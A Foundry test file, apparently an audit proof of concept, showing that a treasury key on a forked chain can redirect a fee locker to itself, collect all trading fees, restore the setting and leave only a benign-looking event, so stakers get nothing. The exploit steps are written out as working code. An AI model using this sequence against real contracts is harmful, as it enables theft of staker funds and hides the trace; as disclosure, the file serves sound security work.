// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, Vm} from "forge-std/Test.sol";
import {IERC20} from "oz/token/ERC20/IERC20.sol";
import {RealYieldStaking} from "../../src/RealYieldStaking.sol";
import {NlyraFeeSplitter} from "../../src/NlyraFeeSplitter.sol";
import {IPonsLaunchLocker, IUniswapV3PoolLike} from "../../src/interfaces/External.sol";
import {ForkPin} from "../ForkBase.sol";

contract VTreasuryDivertPoC is Test {
    IERC20 constant NLYRA = IERC20(0xB9d3824149aD8ac984153CeEc91D5a2405d1FB95);
    IERC20 constant WETH = IERC20(0x0Bd7D308f8E1639FAb988df18A8011f41EAcAD73);
    IERC20 constant USDG = IERC20(0x5fc5360D0400a0Fd4f2af552ADD042D716F1d168);
    address constant POOL_NLYRA = 0x483C24d1e36Df01b650F1E9BEEB2a1c31C005C39;
    address constant POOL_USDG = 0x52e65B17fB6E5BA00Ed806f37Afcd2DaA50271Ca;
    IPonsLaunchLocker constant LOCKER = IPonsLaunchLocker(0x736D76699C26D0d966744cAe304C000d471f7F35);
    address constant TREASURY = 0xe30647793192D15BFA6E53aE8651368d332fe04C;

    RealYieldStaking st;
    NlyraFeeSplitter sp;

    function setUp() public {
        vm.createSelectFork("robin", vm.envOr("FORK_BLOCK", ForkPin.BLOCK));
        st = new RealYieldStaking(
            makeAddr("owner"), address(NLYRA), address(WETH), address(USDG), POOL_NLYRA, POOL_USDG,
            address(LOCKER), TREASURY, 5_000, 1 days
        );
        sp = NlyraFeeSplitter(payable(st.feeSplitter()));
        vm.prank(TREASURY);
        LOCKER.setFeeRedirect(address(NLYRA), address(sp));
    }

    function _trade(uint256 wethAmt, uint256 rounds) internal {
        deal(address(WETH), address(this), WETH.balanceOf(address(this)) + wethAmt);
        for (uint256 i; i < rounds; ++i) {
            (, int256 a1) = IUniswapV3PoolLike(POOL_NLYRA).swap(address(this), true, int256(wethAmt), 4295128740, "");
            (int256 b0,) = IUniswapV3PoolLike(POOL_NLYRA).swap(
                address(this), false, int256(uint256(-a1)), 1461446703485210103287273052203988822378723970341, ""
            );
            wethAmt = uint256(-b0);
        }
    }

    function uniswapV3SwapCallback(int256 a0, int256 a1, bytes calldata) external {
        if (a0 > 0) IERC20(IUniswapV3PoolLike(msg.sender).token0()).transfer(msg.sender, uint256(a0));
        if (a1 > 0) IERC20(IUniswapV3PoolLike(msg.sender).token1()).transfer(msg.sender, uint256(a1));
    }

    /// Treasury key (or its 7702 delegate) redirects, collects 100%, flips back; harvest only emits CollectSkipped.
    function test_treasuryDivertsAndHidesIt() public {
        // recipient = TREASURY itself (a compromised key then forwards anywhere). A fresh attacker
        // address would need uncached fork slots, which the local node no longer serves at this block.
        address attacker = TREASURY;
        uint256 w0 = WETH.balanceOf(attacker);
        uint256 n0 = NLYRA.balanceOf(attacker);
        _trade(2 ether, 3);

        vm.startPrank(TREASURY);
        LOCKER.setFeeRedirect(address(NLYRA), attacker);
        LOCKER.collectFees(address(NLYRA));
        LOCKER.setFeeRedirect(address(NLYRA), address(sp));
        vm.stopPrank();

        uint256 aw = WETH.balanceOf(attacker) - w0;
        uint256 an = NLYRA.balanceOf(attacker) - n0;
        emit log_named_uint("attacker WETH", aw);
        emit log_named_uint("attacker NLYRA", an);
        assertGt(aw + an, 0);
        assertEq(LOCKER.feeRedirects(address(NLYRA)), address(sp), "redirect restored");

        // splitter harvest: nothing to collect, tolerated (desde la ronda 2 el harvest nunca revierte por
        // estar vacio); el unico rastro es CollectSkipped(NoFeesToCollect)
        deal(address(WETH), address(sp), 1);
        vm.recordLogs();
        sp.harvest();
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bool skipped;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics[0] == NlyraFeeSplitter.CollectSkipped.selector) {
                skipped = true;
                assertEq(bytes4(abi.decode(logs[i].data, (bytes32))), IPonsLaunchLocker.NoFeesToCollect.selector);
            }
        }
        assertTrue(skipped, "only trace is CollectSkipped(NoFeesToCollect)");
        assertEq(WETH.balanceOf(address(st)), 0, "stakers got 0 of the diverted fees (1 wei rounds to 0)");
    }

    /// No rotation path: TREASURY and STAKING are immutable, staking only accepts notify from its own splitter.
    function test_noRotation() public {
        assertEq(sp.TREASURY(), TREASURY);
        NlyraFeeSplitter sp2 = new NlyraFeeSplitter(
            address(LOCKER), address(NLYRA), address(WETH), address(st), makeAddr("newTreasury"), 5_000, 1 days
        );
        assertEq(sp2.STAKING(), address(st));
        vm.prank(address(sp2));
        vm.expectRevert(RealYieldStaking.OnlySplitter.selector);
        st.notifyRewards(0, 0);
    }
}
